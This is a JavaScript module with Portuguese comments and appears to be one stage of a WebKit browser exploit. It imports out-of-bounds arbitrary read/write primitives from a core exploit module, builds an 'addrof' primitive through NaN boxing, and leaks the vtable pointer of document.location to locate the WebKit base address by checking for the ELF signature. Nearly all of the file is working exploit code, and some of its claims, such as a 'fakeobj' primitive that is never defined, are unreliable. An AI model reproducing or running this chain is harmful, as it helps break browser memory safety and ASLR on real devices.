// js/script3/testArrayBufferVictimCrash.mjs (v110 - Estratégia Híbrida com Primitivas do Core)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Abandona as primitivas de L/E defeituosas que causavam o erro de "stale value".
// - Importa e utiliza as primitivas de L/E robustas e assíncronas de 'core_exploit.mjs'.
// - Mantém a primitiva 'addrof' (NaN Boxing) que funciona corretamente para vazar endereços.
// - Adiciona um autoteste obrigatório no início para validar as primitivas do core.
// - Inclui logs extremamente detalhados para depuração passo a passo.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    isOOBReady,
    arb_read,
    selfTestOOBReadWrite
} from '../core_exploit.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v110_CorePrimitives";

// --- Funções de Conversão (Double <-> Int64) - Mantidas para 'addrof' e 'fakeobj' ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// TESTE DE VAZAMENTO DA BASE DO WEBKIT (Atualizado para usar primitivas robustas)
// =======================================================================================
async function runWebKitBaseLeakTest(addrof_primitive, arb_read_primitive) {
    const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v110";
    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit ---`, "subtest", FNAME_LEAK_TEST);
    try {
        // 1. Obter um objeto WebKit conhecido.
        const location_obj = document.location;
        logS3(`[PASS0 1] Alvo para o vazamento: document.location`, "info", FNAME_LEAK_TEST);

        // 2. Usar 'addrof' (NaN Boxing) para obter o endereço do objeto JS.
        const location_addr = addrof_primitive(location_obj);
        logS3(`[PASS0 2] Endereço do objeto JSLocation (via addrof): ${toHex(location_addr)}`, "leak", FNAME_LEAK_TEST);
        if (location_addr.low() === 0 && location_addr.high() === 0) {
            throw new Error("addrof retornou um endereço nulo para document.location.");
        }

        // 3. Ler o primeiro campo (8 bytes) do objeto usando a primitiva robusta 'arb_read'. Este deve ser o ponteiro da vtable.
        logS3(`[PASS0 3] Lendo 8 bytes de ${toHex(location_addr)} para obter o ponteiro da vtable...`, "info", FNAME_LEAK_TEST);
        const vtable_ptr = await arb_read_primitive(location_addr, 8);
        logS3(`[PASS0 4] Ponteiro da Vtable vazado (via arb_read): ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
            throw new Error("Ponteiro da vtable vazado é nulo. A leitura pode ter falhado ou o objeto é inválido.");
        }

        // 4. Calcular o endereço base alinhando o ponteiro da vtable para baixo (máscara 0x4000).
        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
        const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
        logS3(`[PASS0 5] Candidato a endereço base do WebKit (alinhado em 0x4000): ${toHex(webkit_base_candidate)}`, "leak", FNAME_LEAK_TEST);

        // 5. Verificação: Ler os primeiros 4 bytes do endereço base candidato e checar a assinatura "ELF".
        logS3(`[PASS0 6] Lendo 8 bytes de ${toHex(webkit_base_candidate)} para verificar a assinatura ELF...`, "info", FNAME_LEAK_TEST);
        const elf_magic_full = await arb_read_primitive(webkit_base_candidate, 8);
        const elf_magic_low = elf_magic_full.low();
        logS3(`[PASS0 7] Assinatura lida do endereço base: ${toHex(elf_magic_low)}`, "leak", FNAME_LEAK_TEST);
        
        // A assinatura ELF é 0x7F seguido por 'E', 'L', 'F'. Em little-endian, isso é 0x464C457F.
        if (elf_magic_low === 0x464C457F) {
            logS3(`++++++++++++ SUCESSO DE VAZAMENTO! Assinatura ELF encontrada! ++++++++++++`, "vuln", FNAME_LEAK_TEST);
            logS3(`A base do WebKit é muito provavelmente: ${toHex(webkit_base_candidate)}`, "vuln", FNAME_LEAK_TEST);
            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
        } else {
            throw new Error(`Assinatura ELF não encontrada. Lido: ${toHex(elf_magic_low)}, Esperado: 0x464C457F.`);
        }

    } catch(e) {
        logS3(`[FALHA] Falha no teste de vazamento do WebKit: ${e.message}`, "critical", FNAME_LEAK_TEST);
        console.error(e);
        return { success: false, webkit_base: null };
    }
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (Atualizada para a nova estratégia)
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Híbridas ---`, "test");

    let final_result = { success: false, message: "Teste não iniciado corretamente.", webkit_base: null };

    try {
        // --- FASE 1: INICIALIZAR E VALIDAR PRIMITIVAS DO CORE_EXPLOIT ---
        logS3("--- FASE 1/4: Configurando ambiente OOB de core_exploit.mjs... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha crítica ao inicializar o ambiente OOB. As primitivas de L/E não funcionarão.");
        }
        logS3("Ambiente OOB configurado com sucesso.", "good");

        logS3("--- FASE 2/4: Executando autoteste de Leitura/Escrita do core_exploit... ---", "subtest");
        const self_test_ok = await selfTestOOBReadWrite(logS3); // Passa o logger para ter logs detalhados
        if (!self_test_ok) {
            throw new Error("Autoteste das primitivas de L/E do core_exploit FALHOU. Abortando.");
        }
        logS3("Autoteste de Leitura/Escrita concluído com SUCESSO. Primitivas 'arb_read' e 'arb_write' estão operacionais.", "vuln");

        // --- FASE 3: CONFIGURAR PRIMITIVAS 'addrof' E 'fakeobj' ---
        logS3("--- FASE 3/4: Configurando primitivas 'addrof' e 'fakeobj' (NaN Boxing)... ---", "subtest");
        const vulnerable_slot = [13.37]; 
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
        const addrof = (obj) => {
            vulnerable_slot[0] = obj;
            let value_as_double = vulnerable_slot[0];
            let value_as_int64 = doubleToInt64(value_as_double);
            return value_as_int64.sub(NAN_BOXING_OFFSET);
        };
        logS3("Primitiva 'addrof' robusta está operacional.", "good");
       
        // --- FASE 4: EXECUTAR O VAZAMENTO DA BASE DO WEBKIT ---
        logS3("--- FASE 4/4: Tentando vazar a base do WebKit usando a estratégia híbrida... ---", "subtest");
        // Passa a primitiva 'addrof' local e a primitiva 'arb_read' importada
        const leak_result = await runWebKitBaseLeakTest(addrof, arb_read);
        
        if (leak_result.success) {
             final_result = {
                success: true,
                message: "Cadeia de exploração concluída com SUCESSO. Base do WebKit VAZADA!",
                webkit_base: leak_result.webkit_base
            };
        } else {
             final_result = {
                success: false, // O teste em si pode ter rodado, mas o objetivo falhou
                message: "Cadeia de exploração executada, mas o vazamento da base do WebKit FALHOU. Verifique os logs.",
                webkit_base: null
            };
        }

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
